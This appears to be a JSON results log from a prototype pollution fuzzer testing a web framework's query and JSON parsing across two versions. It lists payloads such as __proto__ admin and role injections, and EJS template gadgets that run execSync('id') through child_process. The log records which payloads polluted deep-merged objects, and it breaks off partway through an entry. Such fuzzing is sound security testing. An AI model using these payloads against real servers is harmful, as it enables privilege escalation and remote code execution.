@@ -1,0 +1,1843 @@
+{
+  "metadata": {
+    "phase": "2.2",
+    "name": "Prototype Pollution Fuzzer",
+    "timestamp": "2026-02-15T12:30:37.111556",
+    "scope": "Framework query/body parsing \u2014 prototype pollution"
+  },
+  "tests": [
+    {
+      "id": 1,
+      "test": "qs_proto_direct",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 2,
+      "test": "qs_proto_admin",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[admin]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 3,
+      "test": "qs_proto_isAdmin",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[isAdmin]=1",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 4,
+      "test": "qs_proto_role",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[role]=admin",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 5,
+      "test": "qs_proto_nested",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[__proto__][deep]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 6,
+      "test": "qs_constructor_proto",
+      "version": "v5",
+      "data": {
+        "payload": "constructor[prototype][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 7,
+      "test": "qs_constructor_proto_admin",
+      "version": "v5",
+      "data": {
+        "payload": "constructor[prototype][admin]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 8,
+      "test": "qs_proto_encoded",
+      "version": "v5",
+      "data": {
+        "payload": "%5f%5fproto%5f%5f%5bpolluted%5d=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 9,
+      "test": "qs_proto_double_encoded",
+      "version": "v5",
+      "data": {
+        "payload": "%255f%255fproto%255f%255f%255bpolluted%255d=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 10,
+      "test": "qs_proto_unicode",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 11,
+      "test": "qs_bracket_proto",
+      "version": "v5",
+      "data": {
+        "payload": "a[__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 12,
+      "test": "qs_bracket_constructor",
+      "version": "v5",
+      "data": {
+        "payload": "a[constructor][prototype][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 13,
+      "test": "qs_deep_bracket",
+      "version": "v5",
+      "data": {
+        "payload": "a[b][__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 14,
+      "test": "qs_array_proto",
+      "version": "v5",
+      "data": {
+        "payload": "a[0]=1&a[__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 15,
+      "test": "qs_proto_toString",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[toString]=evil",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 16,
+      "test": "qs_proto_valueOf",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[valueOf]=evil",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 17,
+      "test": "qs_proto_hasOwnProperty",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[hasOwnProperty]=evil",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 18,
+      "test": "qs_proto_outputFunctionName",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[outputFunctionName]=x;process.mainModule.require(\"child_process\").execSync(\"id\");//",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 19,
+      "test": "qs_proto_escapeFunction",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[escapeFunction]=1;process.mainModule.require(\"child_process\").execSync(\"id\");//",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 20,
+      "test": "qs_proto_client",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[client]=1",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 21,
+      "test": "qs_proto_debug",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[debug]=1",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 22,
+      "test": "qs_proto_empty",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__=",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 23,
+      "test": "qs_proto_null",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[polluted]=null",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 24,
+      "test": "qs_proto_zero",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[polluted]=0",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 25,
+      "test": "qs_proto_array",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__[polluted][]=1",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 26,
+      "test": "qs_proto_space",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__ [polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 27,
+      "test": "qs_proto_tab",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__\t[polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 28,
+      "test": "qs_proto_dot",
+      "version": "v5",
+      "data": {
+        "payload": "__proto__.polluted=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 29,
+      "test": "qs_deep_nest_5",
+      "version": "v5",
+      "data": {
+        "payload": "a[b][c][d][e][__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 30,
+      "test": "qs_deep_nest_10",
+      "version": "v5",
+      "data": {
+        "payload": "a[b][c][d][e][f][g][h][i][j][__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 31,
+      "test": "qs_proto_direct",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 32,
+      "test": "qs_proto_admin",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[admin]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 33,
+      "test": "qs_proto_isAdmin",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[isAdmin]=1",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 34,
+      "test": "qs_proto_role",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[role]=admin",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 35,
+      "test": "qs_proto_nested",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[__proto__][deep]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 36,
+      "test": "qs_constructor_proto",
+      "version": "v4",
+      "data": {
+        "payload": "constructor[prototype][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 37,
+      "test": "qs_constructor_proto_admin",
+      "version": "v4",
+      "data": {
+        "payload": "constructor[prototype][admin]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 38,
+      "test": "qs_proto_encoded",
+      "version": "v4",
+      "data": {
+        "payload": "%5f%5fproto%5f%5f%5bpolluted%5d=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 39,
+      "test": "qs_proto_double_encoded",
+      "version": "v4",
+      "data": {
+        "payload": "%255f%255fproto%255f%255f%255bpolluted%255d=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 40,
+      "test": "qs_proto_unicode",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 41,
+      "test": "qs_bracket_proto",
+      "version": "v4",
+      "data": {
+        "payload": "a[__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 42,
+      "test": "qs_bracket_constructor",
+      "version": "v4",
+      "data": {
+        "payload": "a[constructor][prototype][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 43,
+      "test": "qs_deep_bracket",
+      "version": "v4",
+      "data": {
+        "payload": "a[b][__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 44,
+      "test": "qs_array_proto",
+      "version": "v4",
+      "data": {
+        "payload": "a[0]=1&a[__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 45,
+      "test": "qs_proto_toString",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[toString]=evil",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 46,
+      "test": "qs_proto_valueOf",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[valueOf]=evil",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 47,
+      "test": "qs_proto_hasOwnProperty",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[hasOwnProperty]=evil",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 48,
+      "test": "qs_proto_outputFunctionName",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[outputFunctionName]=x;process.mainModule.require(\"child_process\").execSync(\"id\");//",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 49,
+      "test": "qs_proto_escapeFunction",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[escapeFunction]=1;process.mainModule.require(\"child_process\").execSync(\"id\");//",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 50,
+      "test": "qs_proto_client",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[client]=1",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 51,
+      "test": "qs_proto_debug",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[debug]=1",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 52,
+      "test": "qs_proto_empty",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__=",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 53,
+      "test": "qs_proto_null",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[polluted]=null",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 54,
+      "test": "qs_proto_zero",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[polluted]=0",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 55,
+      "test": "qs_proto_array",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__[polluted][]=1",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 56,
+      "test": "qs_proto_space",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__ [polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 57,
+      "test": "qs_proto_tab",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__\t[polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 58,
+      "test": "qs_proto_dot",
+      "version": "v4",
+      "data": {
+        "payload": "__proto__.polluted=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 59,
+      "test": "qs_deep_nest_5",
+      "version": "v4",
+      "data": {
+        "payload": "a[b][c][d][e][__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 60,
+      "test": "qs_deep_nest_10",
+      "version": "v4",
+      "data": {
+        "payload": "a[b][c][d][e][f][g][h][i][j][__proto__][polluted]=true",
+        "status": 200,
+        "pollution_detected": false,
+        "polluted_keys": {}
+      }
+    },
+    {
+      "id": 61,
+      "test": "json_proto_direct",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'polluted': 'true'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 62,
+      "test": "json_proto_admin",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'admin': True}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "admin": true
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 63,
+      "test": "json_proto_nested",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'__proto__': {'deep': True}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {},
+        "assign_status": 201,
+        "merge_status": 500
+      }
+    },
+    {
+      "id": 64,
+      "test": "json_proto_multiple",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'polluted': True, 'admin': True, 'role': 'admin'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": true,
+          "admin": true,
+          "role": "admin"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 65,
+      "test": "json_constructor_proto",
+      "version": "v5",
+      "data": {
+        "payload": "{'constructor': {'prototype': {'polluted': 'true'}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 66,
+      "test": "json_constructor_deep",
+      "version": "v5",
+      "data": {
+        "payload": "{'a': {'constructor': {'prototype': {'polluted': 'true'}}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 67,
+      "test": "json_nested_proto",
+      "version": "v5",
+      "data": {
+        "payload": "{'a': {'__proto__': {'polluted': 'true'}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 68,
+      "test": "json_deep_nested_proto",
+      "version": "v5",
+      "data": {
+        "payload": "{'a': {'b': {'__proto__': {'polluted': 'true'}}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 69,
+      "test": "json_array_proto",
+      "version": "v5",
+      "data": {
+        "payload": "[{'__proto__': {'polluted': 'true'}}]",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 70,
+      "test": "json_ejs_outputFn",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'outputFunctionName': 'x;process.mainModule.require(\"child_process\").execSync(\"id\")//'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\")//"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 71,
+      "test": "json_ejs_client",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'client': True}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {},
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 72,
+      "test": "json_ejs_escape",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'escapeFunction': '1;process.mainModule.require(\"child_process\").execSync(\"id\")//'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {},
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 73,
+      "test": "json_proto_shell",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'shell': '/bin/sh'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "shell": "/bin/sh"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 74,
+      "test": "json_proto_env",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'env': {'EVIL': 'true'}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "env": {
+            "EVIL": "true"
+          }
+        },
+        "assign_status": 201,
+        "merge_status": 500
+      }
+    },
+    {
+      "id": 75,
+      "test": "json_proto_number",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'polluted': 1}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": 1
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 76,
+      "test": "json_proto_bool",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'polluted': True}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": true
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 77,
+      "test": "json_proto_null",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'polluted': None}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {},
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 78,
+      "test": "json_proto_object",
+      "version": "v5",
+      "data": {
+        "payload": "{'__proto__': {'polluted': {'nested': True}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": {
+            "nested": true
+          }
+        },
+        "assign_status": 201,
+        "merge_status": 500
+      }
+    },
+    {
+      "id": 79,
+      "test": "json_proto_direct",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'polluted': 'true'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 80,
+      "test": "json_proto_admin",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'admin': True}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "admin": true
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 81,
+      "test": "json_proto_nested",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'__proto__': {'deep': True}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {},
+        "assign_status": 201,
+        "merge_status": 500
+      }
+    },
+    {
+      "id": 82,
+      "test": "json_proto_multiple",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'polluted': True, 'admin': True, 'role': 'admin'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": true,
+          "admin": true,
+          "role": "admin"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 83,
+      "test": "json_constructor_proto",
+      "version": "v4",
+      "data": {
+        "payload": "{'constructor': {'prototype': {'polluted': 'true'}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 84,
+      "test": "json_constructor_deep",
+      "version": "v4",
+      "data": {
+        "payload": "{'a': {'constructor': {'prototype': {'polluted': 'true'}}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 85,
+      "test": "json_nested_proto",
+      "version": "v4",
+      "data": {
+        "payload": "{'a': {'__proto__': {'polluted': 'true'}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 86,
+      "test": "json_deep_nested_proto",
+      "version": "v4",
+      "data": {
+        "payload": "{'a': {'b': {'__proto__': {'polluted': 'true'}}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 87,
+      "test": "json_array_proto",
+      "version": "v4",
+      "data": {
+        "payload": "[{'__proto__': {'polluted': 'true'}}]",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": "true"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 88,
+      "test": "json_ejs_outputFn",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'outputFunctionName': 'x;process.mainModule.require(\"child_process\").execSync(\"id\")//'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\")//"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 89,
+      "test": "json_ejs_client",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'client': True}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {},
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 90,
+      "test": "json_ejs_escape",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'escapeFunction': '1;process.mainModule.require(\"child_process\").execSync(\"id\")//'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {},
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 91,
+      "test": "json_proto_shell",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'shell': '/bin/sh'}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "shell": "/bin/sh"
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 92,
+      "test": "json_proto_env",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'env': {'EVIL': 'true'}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "env": {
+            "EVIL": "true"
+          }
+        },
+        "assign_status": 201,
+        "merge_status": 500
+      }
+    },
+    {
+      "id": 93,
+      "test": "json_proto_number",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'polluted': 1}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": 1
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 94,
+      "test": "json_proto_bool",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'polluted': True}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": true
+        },
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 95,
+      "test": "json_proto_null",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'polluted': None}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {},
+        "assign_status": 201,
+        "merge_status": 200
+      }
+    },
+    {
+      "id": 96,
+      "test": "json_proto_object",
+      "version": "v4",
+      "data": {
+        "payload": "{'__proto__': {'polluted': {'nested': True}}}",
+        "object_assign_pollution": {},
+        "deep_merge_pollution": {
+          "polluted": {
+            "nested": true
+          }
+        },
+        "assign_status": 201,
+        "merge_status": 500
+      }
+    },
+    {
+      "id": 97,
+      "test": "merge_depth_1",
+      "version": "v5",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "depth1"
+        },
+        "global_pollution": {
+          "polluted": "depth1"
+        }
+      }
+    },
+    {
+      "id": 98,
+      "test": "merge_depth_2",
+      "version": "v5",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "depth2"
+        },
+        "global_pollution": {
+          "polluted": "depth2"
+        }
+      }
+    },
+    {
+      "id": 99,
+      "test": "merge_depth_3",
+      "version": "v5",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "depth3"
+        },
+        "global_pollution": {
+          "polluted": "depth3"
+        }
+      }
+    },
+    {
+      "id": 100,
+      "test": "merge_constructor_1",
+      "version": "v5",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "constructor1"
+        },
+        "global_pollution": {
+          "polluted": "constructor1"
+        }
+      }
+    },
+    {
+      "id": 101,
+      "test": "merge_mixed",
+      "version": "v5",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "mixed"
+        },
+        "global_pollution": {
+          "polluted": "mixed"
+        }
+      }
+    },
+    {
+      "id": 102,
+      "test": "merge_hidden_in_large",
+      "version": "v5",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "hidden"
+        },
+        "global_pollution": {
+          "polluted": "hidden"
+        }
+      }
+    },
+    {
+      "id": 103,
+      "test": "merge_overwrite_tostring",
+      "version": "v5",
+      "data": {
+        "status": 200,
+        "inline_pollution": {},
+        "global_pollution": {}
+      }
+    },
+    {
+      "id": 104,
+      "test": "merge_overwrite_valueof",
+      "version": "v5",
+      "data": {
+        "status": 200,
+        "inline_pollution": {},
+        "global_pollution": {}
+      }
+    },
+    {
+      "id": 105,
+      "test": "merge_depth_1",
+      "version": "v4",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "depth1"
+        },
+        "global_pollution": {
+          "polluted": "depth1"
+        }
+      }
+    },
+    {
+      "id": 106,
+      "test": "merge_depth_2",
+      "version": "v4",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "depth2"
+        },
+        "global_pollution": {
+          "polluted": "depth2"
+        }
+      }
+    },
+    {
+      "id": 107,
+      "test": "merge_depth_3",
+      "version": "v4",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "depth3"
+        },
+        "global_pollution": {
+          "polluted": "depth3"
+        }
+      }
+    },
+    {
+      "id": 108,
+      "test": "merge_constructor_1",
+      "version": "v4",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "constructor1"
+        },
+        "global_pollution": {
+          "polluted": "constructor1"
+        }
+      }
+    },
+    {
+      "id": 109,
+      "test": "merge_mixed",
+      "version": "v4",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "mixed"
+        },
+        "global_pollution": {
+          "polluted": "mixed"
+        }
+      }
+    },
+    {
+      "id": 110,
+      "test": "merge_hidden_in_large",
+      "version": "v4",
+      "data": {
+        "status": 200,
+        "inline_pollution": {
+          "polluted": "hidden"
+        },
+        "global_pollution": {
+          "polluted": "hidden"
+        }
+      }
+    },
+    {
+      "id": 111,
+      "test": "merge_overwrite_tostring",
+      "version": "v4",
+      "data": {
+        "status": 200,
+        "inline_pollution": {},
+        "global_pollution": {}
+      }
+    },
+    {
+      "id": 112,
+      "test": "merge_overwrite_valueof",
+      "version": "v4",
+      "data": {
+        "status": 500,
+        "inline_pollution": {},
+        "global_pollution": {}
+      }
+    },
+    {
+      "id": 113,
+      "test": "rce_ejs_outputFunctionName_rce",
+      "version": "v5",
+      "data": {
+        "pollution_status": 200,
+        "polluted_keys": {
+          "outputFunctionName": "x;return global.process.mainModule.constructor._resolveFilename(\"os\")//"
+        },
+        "trigger_status": 200,
+        "trigger_response": "Hello, test!",
+        "rce_indicators": false
+      }
+    },
+    {
+      "id": 114,
+      "test": "rce_ejs_client_true",
+      "version": "v5",
+      "data": {
+        "pollution_status": 200,
+        "polluted_keys": {},
+        "trigger_status": 200,
+        "trigger_response": "Hello, test!",
+        "rce_indicators": false
+      }
+    },
+    {
+      "id": 115,
+      "test": "rce_ejs_debug",
+      "version": "v5",
+      "data": {
+        "pollution_status": 200,
+        "polluted_keys": {},
+        "trigger_status": 200,
+        "trigger_response": "Hello, test!",
+        "rce_indicators": false
+      }
+    },
+    {
+      "id": 116,
+      "test": "rce_ejs_outputFunctionName_rce",
+      "version": "v4",
+      "data": {
+        "pollution_status": 500,
+        "polluted_keys": {},
+        "trigger_status": 500,
